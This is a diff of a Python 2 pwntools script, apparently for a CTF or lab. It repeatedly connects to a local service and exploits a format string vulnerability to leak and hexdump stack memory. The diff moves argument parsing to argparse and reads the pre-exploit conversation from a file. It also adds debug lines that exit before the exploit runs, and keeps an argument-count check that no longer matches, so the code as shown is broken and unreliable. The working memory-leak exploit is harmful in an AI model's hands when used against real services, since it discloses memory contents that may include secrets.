@@ -1,5 +1,5 @@
 from pwn import *
-import re, sys, hexdump, time
+import argparse, hexdump, re, sys, time
 
 # Parameters:
 # r: (remote) process
@@ -15,16 +15,31 @@ def get64(r, u, n):
         data += "".join([x[i:i+2] for i in range(0, len(x), 2)][::-1])
     return data
 
+parser = argparse.ArgumentParser()
+parser.add_argument('n', type=int, help='Number of repetitions')
+parser.add_argument('w', type=int, help='Number of words to print')
+parser.add_argument('t', type=float, help='Time to sleep between repetitions in seconds')
+parser.add_argument('f', type=str, help='File containing the conversation until the format string vulnerability vector')
+args = parser.parse_args()
+
+print args.n
+
+sys.exit(1)
 
 context.log_level='error'
 if len(sys.argv) != 3:
     print 'Usage: ./prog <number of repetitions> <number of words to print> <time to sleep between repetitions in seconds>'
     sys.exit(2)
 
+
 H,P='localhost',6666
+pre = ''
+with open(args.f, 'r') as f:
+    pre = f.read()
+
 #H,P='pwnbox',1337
-for i in range(int(sys.argv[1])):
+for i in range(args.n):
     r = remote(H,P)
-    dump = get64(r, 'Hello ', int(sys.argv[2]))
+    dump = get64(r, pre, args.w)
     hexdump.hexdump(dump.decode('hex'))
-    time.sleep(float(sys.argv[3]))
+    time.sleep(args.t)
